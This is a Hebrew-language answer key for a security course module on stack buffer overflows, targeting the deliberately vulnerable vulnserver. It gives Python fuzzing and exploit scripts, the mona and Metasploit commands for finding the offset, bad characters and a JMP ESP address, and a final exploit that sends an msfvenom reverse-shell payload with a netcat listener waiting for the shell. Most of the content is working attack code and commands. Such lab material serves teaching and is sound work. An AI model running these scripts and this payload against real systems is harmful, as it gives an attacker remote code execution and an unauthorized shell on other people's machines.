<div dir="rtl">

# ✅ פתרונות מלאים — מודול 10: גלישת חוצץ

> נסה לבד ב-[`missions.md`](missions.md) קודם. כל הפעולות על `vulnserver` בסביבת תרגול חוקית בלבד.

---

## חלק א' — הבנת המבנה

**10.1** — **EIP** מצביע על ההוראה הבאה שהמעבד יריץ; **ESP** מצביע על ראש ה-Stack. EIP הוא המטרה כי מי ששולט בו **קובע לאן יקפוץ הביצוע** — אפשר להפנות אותו לקוד של התוקף (Shellcode).

**10.2** — לפני: `[Buffer][Saved EBP][Return/EIP]`. אחרי גלישה: הקלט הארוך ממלא את ה-Buffer, דורס את ה-EBP, וממשיך לדרוס את כתובת החזרה (**EIP**) — שם נשתול את הכתובת שלנו.

**10.3**
```bash
nc <windows-ip> 9999
HELP
# פקודות: STATS, RTIME, LTIME, SRUN, TRUN, GMON, GDOG, KSTET, GTER, HTER, LTER, KSTAN
```

---

## חלק ב' — Fuzzing ו-Offset

**10.4**
```python
#!/usr/bin/python3
import socket, time, sys
ip, port = "192.168.1.50", 9999
buf = "A" * 100
while True:
    try:
        s = socket.socket(); s.connect((ip, port))
        s.send(("TRUN /.:/" + buf).encode()); s.close()
        print("Sent %d bytes" % len(buf)); buf += "A"*100; time.sleep(1)
    except:
        print("Crashed at %d" % len(buf)); sys.exit()
```
לרוב קורס סביב **2000–2100 בתים**.

**10.5**
```bash
msf-pattern_create -l 3000        # מדביקים במקום ה-A בסקריפט, שולחים
# קוראים את EIP ב-Immunity, למשל 386F4337
msf-pattern_offset -l 3000 -q 386F4337
# [*] Exact match at offset 2003
```

**10.6** — שולחים `b"A"*2003 + b"B"*4`. ה-EIP מציג **`42424242`** כי `B` = `0x42` ב-ASCII, וארבעת ה-`B` נכנסו בדיוק למיקום ה-EIP → **הוכחת שליטה**.

---

## חלק ג' — Bad Chars ו-JMP ESP

**10.7** — שולחים `\x01`...`\xff` אחרי ה-EIP.
```text
!mona bytearray -b "\x00"          ← יוצר מערך התייחסות
# שולחים את ה-payload, ואז:
!mona compare -f C:\mona\bytearray.bin -a <כתובת ESP>
```
ב-vulnserver לרוב **רק `\x00`** הוא Bad Char.

**10.8**
```text
!mona modules
```
בוחרים מודול עם **הכול False** (Rebase, SafeSEH, ASLR, NXCompat) — כדי שהכתובת תהיה קבועה וללא הגנות. ב-vulnserver זהו **`essfunc.dll`**.

**10.9**
```text
!mona find -s "\xff\xe4" -m essfunc.dll
# מחזיר למשל 0x625011af
```
בקוד, ב-**Little-Endian**:
```python
eip = b"\xaf\x11\x50\x62"
```

---

## 🔴 אתגר מסכם — Exploit מלא

```python
#!/usr/bin/python3
import socket

ip, port = "192.168.1.50", 9999
offset = 2003
eip = b"\xaf\x11\x50\x62"          # JMP ESP מתוך essfunc.dll
nops = b"\x90" * 16

# msfvenom -p windows/shell_reverse_tcp LHOST=<kali> LPORT=4444 \
#          EXITFUNC=thread -b "\x00" -f python -v shellcode
shellcode =  b""
shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89..."   # (מקוצר)

buffer = b"A"*offset + eip + nops + shellcode
s = socket.socket()
s.connect((ip, port))
s.send(b"TRUN /.:/" + buffer)
s.close()
```
```bash
# טרמינל 1 (Kali) — מאזין:
nc -lvnp 4444
# טרמינל 2 — הרצת ה-Exploit:
python3 exploit.py
# ← בטרמינל 1:  C:\>  whoami   →  Shell! 🎉
```

**מבנה ה-Payload להזכיר:** `A×2003` → `JMP ESP` → `NOP sled` → `Shellcode`.

> עברת? כתבת Exploit BOF מלא בעצמך — זו אבן דרך אמיתית. המשך ל[מודול 11](../11-post-exploitation-privesc/).

</div>
